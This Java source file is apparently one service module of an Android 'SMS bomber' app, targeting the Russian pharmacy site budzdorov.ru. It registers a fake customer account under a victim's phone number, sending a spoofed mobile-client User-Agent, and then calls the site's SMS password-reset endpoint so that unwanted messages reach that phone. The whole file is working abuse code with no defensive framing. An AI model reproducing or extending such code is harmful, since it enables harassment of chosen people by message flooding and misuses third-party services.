package com.dm.bomber.services;

import androidx.annotation.NonNull;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class BudZdorov extends Service {

    @Override
    public void run(Callback callback) {
        JSONObject main = new JSONObject();
        JSONObject customer = new JSONObject();
        JSONObject extension = new JSONObject();

        try {
            extension.put("is_subscribed", "false");
            extension.put("telephone", format(getFormattedPhone(), "+* (***) ***-**-**"));
            extension.put("via_sms_notify", "true");
            extension.put("favorite_store_point", "0");
            extension.put("device_uu_id", "2652f89e-97e4-49dd-9ccf-c94c3226de59");

            customer.put("email", getEmail());
            customer.put("firstname", "Иван");
            customer.put("middlename", "Иванович");
            customer.put("lastname", "Иванов");
            customer.put("extension_attributes", extension);
            main.put("customer", customer);
        } catch (JSONException e) {
            e.printStackTrace();
        }

        client.newCall(new Request.Builder()
                .url("https://www.budzdorov.ru/rest/V1/recaptcha/customers")
                .header("User-Agent", "RiglaMobileClient(android Android-Q-build-20210804020623 2.10.2 (stable) (Tue Oct 13 15:50:27 2020 +0200) on 'android_arm64')")
                .header("platform", "android")
                .post(RequestBody.create(main.toString(), MediaType.parse("application/json")))
                .build()).enqueue(new Callback() {
            @Override
            public void onFailure(@NonNull Call call, @NonNull IOException e) {
                callback.onFailure(call, e);
            }

            @Override
            public void onResponse(@NonNull Call call, @NonNull Response response) throws IOException {
                try {
                    JSONObject data = new JSONObject();
                    data.put("contact", format(getFormattedPhone(), "+* (***) ***-**-**"));
                    data.put("type", "telephone");
                    data.put("template", "email_reset");
                    data.put("websiteId", "0");

                    client.newCall(new Request.Builder()
                            .url("https://www.budzdorov.ru/rest/V1/customers/smsAccount/password")
                            .header("User-Agent", "RiglaMobileClient(android Android-Q-build-20210804020623 2.10.2 (stable) (Tue Oct 13 15:50:27 2020 +0200) on 'android_arm64')")
                            .header("platform", "android")
                            .put(RequestBody.create(data.toString(), MediaType.parse("application/json")))
                            .build()).enqueue(callback);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }
}
